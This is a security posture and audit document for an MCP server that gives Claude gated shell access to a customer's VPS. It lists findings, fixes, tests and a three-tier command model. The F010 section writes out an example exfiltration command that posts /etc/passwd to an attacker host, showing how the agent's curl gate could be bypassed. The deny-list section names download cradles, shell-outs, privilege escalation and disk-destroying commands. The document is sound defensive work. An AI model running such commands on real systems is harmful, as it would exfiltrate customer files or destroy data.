# vps-control-mcp — security posture

Snapshot date: 2026-05-03 (final pre-marketplace audit).
Per-repo posture for `vps-control-mcp` only. The family-level
umbrella covering all three ForgeRift repos lives in
[forgerift-license-api/docs/security/POSTURE.md](https://github.com/ForgeRift/forgerift-license-api/blob/main/docs/security/POSTURE.md);
read that first for cross-cutting context.

## Scope

`vps-control-mcp` is an MCP server that gives Claude controlled,
audited access to a Linux VPS the customer operates. It runs on the
customer's VPS as a long-lived process (typically under PM2). The
plugin is published as an `.mcpb` archive built from this repo's
`main` branch.

## Findings owned by this repo

| ID | Severity | Status | Area | One-liner |
|---|---|---|---|---|
| F010 | MAJOR | fixed `bba65f6` | curl gate | `--url=URL` and `--proxy=URL` bypassed the localhost-only curl restriction, enabling exfil to any external URL |
| F011 | MINOR | fixed `bba65f6` | tests | Two stale curl tests had been failing on every `npm test` run because the implementation had carved curl out for localhost health checks |

The audit's other findings (F001-F009, F012, F013) sit on
`forgerift-license-api` or `local-terminal-mcp`; they're tracked in
the central `findings.csv` because the audit covers all three repos
as one product family.

## Hardening shipped in this audit

### F010 close-out (commit `bba65f6`)

**Problem.** `vps-control-mcp/src/tools.ts:1609` `validateCurlArgs`
walked args with `if (arg.startsWith('-')) continue;` so any flag-
shaped argument was waved through without inspection. Curl supports
the GNU-getopt long form `--url=URL` and `--proxy=URL`, neither of
which is positional, so a call like
`curl --url=http://attacker.com -d @/etc/passwd` bypassed the
localhost-only gate and would actually fetch the external URL while
attaching arbitrary file contents as the POST body. Since
`vps-control-mcp` runs on the customer's VPS where curl can read any
file the process has permission to read, this was a full data-exfil
channel.

**Fix.** The validator now:

  - Walks every arg (no skip on `-`-prefix).
  - Normalises `--key=value` to its value half before comparing.
  - Matches URLs by substring instead of by exact equality, so
    `localhost.attacker.com` and similar DNS-rebinding shapes are
    rejected.
  - Adds IPv6 `[::1]` to the allowed-host list.
  - Compares hosts case-insensitively (`HTTP://LOCALHOST` is now
    accepted, `HTTP://EVIL.COM` is now rejected).
  - Also covers `--proxy=URL` (was previously ignored entirely).

**Verification.** Targeted reproducer `scans/2026-05-03/curl-bypass-
repro.txt` (in the umbrella repo) covers 11 cases including
positional URL, `--url URL` separate-arg, `--url=URL`,
`--proxy=URL`, IPv6 `[::1]`, case-insensitive `HTTP://LOCALHOST`,
DNS-rebinding-shaped `localhost.attacker.com`. Pre-fix: `--url=` and
`--proxy=` returned `null` (allowed). Post-fix: all 11 cases produce
the expected verdict.

### F011 close-out (commit `bba65f6`)

Two test cases in `src/__tests__/security.test.ts` (lines 113 and
534) assumed the blanket data-exfil deny / not-on-allowlist behaviour,
but the implementation had carved curl out for localhost health
checks. The tests had been failing on every `npm test` run prior to
the audit. Refreshed alongside the F010 fix; `npm test` now passes
with no skipped or failing cases (562/562 pre-F010, 591/593 —>
593/593 post-F010 with the new `curl arg gate` describe block adding
9 cases).

## Command-execution model

`vps-control-mcp` runs every shell command through the same three-
layer pipeline as `local-terminal-mcp`, calibrated for the Linux
side instead of Windows:

1. **BLOCKED tier** — POSIX-flavoured deny patterns covering
   eval / eval-adjacent forms (`sh -c`, `bash -c`, `-Command` on
   `pwsh`, perl/python/ruby/groovy/scala/lua/julia/Rscript `-e`),
   download cradles (`wget` + pipe-to-shell, `curl` + pipe-to-shell,
   `base64 -d` + pipe-to-shell), shell-out fronts (`find ... -exec`
   evading the binary allowlist, `xargs` chained from untrusted
   input), privilege escalation (`sudo`, `su -`, `setcap`,
   `setuid`, `newgrp`), filesystem destruction at root scope,
   `mkfs` / `dd if=` / partition primitives, symlink farms.

2. **ALLOWLIST gate** — the binary must be on the positive allowlist.
   Each allowed binary has its own argv validator. Examples:

  - `curl` — URL must resolve to `localhost` / `127.0.0.1` /
    `[::1]` (post-F010 shape covers `--url=` and `--proxy=`).
  - `systemctl` — `--host=` / `--machine=` prefix-checks
    locked down to local-only (per F-S67-43 / S67 hardening). Combined
    short-flag expansion for systemctl too (per F-S67-55).
  - `service` — `--status-all` allowed (per F-S67-42).
  - `git` — same hooks-path neutralisation and credential-flag
    strip as `local-terminal-mcp`.

3. **AMBER vs GREEN tier** — elevated-but-allowed commands
   (`pm2 restart`, `apt-get update`, etc. in operator mode)
   require dry-run-first acknowledgement; the rest go through
   `execFileSync(shell:false)` with a scrubbed env, bounded timeout,
   stdout/stderr capture, and `scrubSecrets()` redaction.

## Other repo-local hardening shipped before this audit

The S67 hardening pass (commit `7b77e4b S68: security hardening v1.13.1
— all fifteenth-pass findings remediated`) addressed 19 individual
findings before the 2026-05-03 audit. Notable items still relevant to
the marketplace story:

  - `constantTimeEqual` length-timing leak fixed (commit `67fdf76`,
    F-S67-53).
  - `validateArgPath` allowlist tightened: removed
    `tr` / `cut` / `paste` / `jq` (commit `6c336a5`,
    F-S67-44).
  - `validateSystemctlArgs` `--host=` / `--machine=` prefix
    checks tightened (commit `b705bdd`, F-S67-43).
  - Combined short-flag expansion in `validateSystemctlArgs` (commit
    `71a7e91`, F-S67-55).
  - Per-field audit log arg capture caps replacing the flat 300-byte
    truncation (commit `f172d8f`, F-S67-54).
  - Pre-commit hook verifies `dist` freshness (commit `d11f753`,
    F-S67-56).

## Test coverage

`npm test` runs 593 cases across the deny list, the allowlist, the
per-binary arg validators, the bypass-corpus regression suite, and the
new `curl arg gate` describe block introduced by the F010 fix.

## Continuous monitoring

- `npm audit` re-run on dependency bumps.
- `npm test` runs in pre-commit hook (`.githooks/pre-commit`)
  alongside `dist` freshness verification and the merge-conflict
  artifact guard.
- License-validation telemetry lands in the central `license_events`
  Supabase table; bad keys / version drift / product-mismatch hits
  alert the operator via the cron sweep at `forgerift-license-api`.

## Methodology + raw evidence

- Cross-repo methodology lives in
  [forgerift-license-api/docs/security/methodology.md](https://github.com/ForgeRift/forgerift-license-api/blob/main/docs/security/methodology.md).
  The "Targeted bypass repro — curl `--url=` flag" entry is the
  F010 reproducer; the "Manual code review — MCP command-injection
  surface" entry is the broader pass that surfaced F010 + F011.
- Central `findings.csv` carries F010 + F011 rows with status,
  fix_commit, evidence path. Lives in the umbrella repo at
  `forgerift-license-api/docs/security/findings.csv`.

## Marketplace-submission readiness

- All findings owned by this repo are fixed.
- Central `findings.csv` has zero `open-needs-dustin` rows.
- `security:` commit pushed to `origin/main`: `bba65f6` (F010 + F011).
- POSTURE + WHITEPAPER in place.
- `npm test` 593/593 pass on `HEAD`.